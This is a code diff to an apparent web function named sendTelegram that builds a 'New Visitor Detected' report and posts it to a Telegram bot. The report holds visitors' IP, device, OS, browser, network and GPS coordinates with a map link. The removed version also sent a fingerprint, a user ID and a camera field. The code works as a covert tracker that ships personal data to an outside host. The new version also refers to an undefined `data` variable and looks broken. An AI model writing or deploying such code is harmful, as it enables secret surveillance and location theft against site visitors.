@@ -24,26 +24,23 @@ export async function onRequestPost({ request, env }) {
 
 async function sendTelegram(env, s) {
 
-  const msg = `
-📡 Visitor Report
+const text = `
+📍 <b>New Visitor Detected</b>
 
-🆔 ${s.session_id}
-👤 ${s.user_id}
+🕒 Time: ${data.time}
+🌐 IP: ${data.ip}
+📱 Device: ${data.device}
+💻 OS: ${data.os}
+🌎 Browser: ${data.browser}
 
-🌐 IP: ${s.ip}
+📡 Network: ${data.network}
 
-📱 ${s.platform || ""}
-🧠 ${s.userAgent || ""}
+📍 Location:
+Lat: ${data.lat}
+Lng: ${data.lng}
 
-🧬 FP: ${s.fingerprint?.slice(0,20)}
-
-📶 ${s.effectiveType || "N/A"}
-
-📍 ${s.lat ? s.lat + "," + s.lng : "Denied"}
-
-📷 ${s.camera}
+🔗 <a href="https://maps.google.com/?q=${data.lat},${data.lng}">Open Map</a>
 `;
-
   await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
